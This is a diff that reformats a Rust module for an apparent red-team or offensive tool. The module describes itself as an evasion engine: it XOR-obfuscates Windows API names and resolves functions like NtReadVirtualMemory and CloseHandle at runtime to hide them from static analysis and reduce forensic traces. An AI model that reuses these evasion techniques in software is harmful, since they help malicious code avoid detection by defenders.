@@ -1,11 +1,11 @@
 //! syscaller.rs — Direct Syscall engine and Dynamic API resolution for evasion.
 //! (Red Audit Remediation - L0/L1)
 
+use crate::obfuscate;
+use crate::xor_str;
 #[cfg(target_arch = "x86_64")]
 use std::arch::asm;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
-use crate::obfuscate;
-use crate::xor_str;
 
 /// Custom handle wrapper for RAII-based closure (Forensic footprint reduction)
 pub struct SafeHandle(pub HANDLE);
@@ -17,10 +17,10 @@ impl Drop for SafeHandle {
                 // Dynamic resolution for CloseHandle (Obfuscated with Polymorphic Key)
                 const K32: [u8; 12] = xor_str!("kernel32.dll", obfuscate::POLY_XOR_KEY);
                 const CH: [u8; 11] = xor_str!("CloseHandle", obfuscate::POLY_XOR_KEY);
-                
+
                 let close_handle = Resolve::api::<unsafe extern "system" fn(HANDLE) -> i32>(
-                    &obfuscate::decrypt(&K32, obfuscate::POLY_XOR_KEY), 
-                    &obfuscate::decrypt(&CH, obfuscate::POLY_XOR_KEY)
+                    &obfuscate::decrypt(&K32, obfuscate::POLY_XOR_KEY),
+                    &obfuscate::decrypt(&CH, obfuscate::POLY_XOR_KEY),
                 );
                 if let Some(f) = close_handle {
                     f(self.0);
@@ -43,14 +43,26 @@ pub unsafe fn nt_read_virtual_memory(
     const NRVM: [u8; 19] = xor_str!("NtReadVirtualMemory", obfuscate::POLY_XOR_KEY);
 
     let func = Resolve::api::<
-        unsafe extern "system" fn(HANDLE, *const std::ffi::c_void, *mut std::ffi::c_void, usize, *mut usize) -> NTSTATUS
+        unsafe extern "system" fn(
+            HANDLE,
+            *const std::ffi::c_void,
+            *mut std::ffi::c_void,
+            usize,
+            *mut usize,
+        ) -> NTSTATUS,
     >(
         &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
-        &obfuscate::decrypt(&NRVM, obfuscate::POLY_XOR_KEY)
+        &obfuscate::decrypt(&NRVM, obfuscate::POLY_XOR_KEY),
     );
 
     if let Some(f) = func {
-        f(process_handle, base_address, buffer, buffer_size, number_of_bytes_read)
+        f(
+            process_handle,
+            base_address,
+            buffer,
+            buffer_size,
+            number_of_bytes_read,
+        )
     } else {
         -1 // Fallback generic error
     }
@@ -69,14 +81,28 @@ pub unsafe fn nt_query_virtual_memory(
     const NQVM: [u8; 20] = xor_str!("NtQueryVirtualMemory", obfuscate::POLY_XOR_KEY);
 
     let func = Resolve::api::<
-        unsafe extern "system" fn(HANDLE, *const std::ffi::c_void, i32, *mut std::ffi::c_void, usize, *mut usize) -> NTSTATUS
+        unsafe extern "system" fn(
+            HANDLE,
+            *const std::ffi::c_void,
+            i32,
+            *mut std::ffi::c_void,
+            usize,
+            *mut usize,
+        ) -> NTSTATUS,
     >(
         &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
-        &obfuscate::decrypt(&NQVM, obfuscate::POLY_XOR_KEY)
+        &obfuscate::decrypt(&NQVM, obfuscate::POLY_XOR_KEY),
     );
 
     if let Some(f) = func {
-        f(process_handle, base_address, memory_information_class, memory_information, memory_information_length, return_length)
+        f(
+            process_handle,
+            base_address,
+            memory_information_class,
+            memory_information,
+            memory_information_length,
+            return_length,
+        )
     } else {
         -1 // Fallback generic error
     }
@@ -89,13 +115,15 @@ impl Resolve {
     /// Resolves a procedure address without static linking.
     pub unsafe fn api<T>(module: &str, function: &str) -> Option<T> {
         use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-        
+
         let mod_cstr = std::ffi::CString::new(module).ok()?;
         let func_cstr = std::ffi::CString::new(function).ok()?;
-        
+
         let h_mod = GetModuleHandleA(mod_cstr.as_ptr() as *const u8);
-        if h_mod == 0 { return None; }
-        
+        if h_mod == 0 {
+            return None;
+        }
+
         let addr = GetProcAddress(h_mod, func_cstr.as_ptr() as *const u8);
         addr.map(|f| std::mem::transmute_copy(&f))
     }
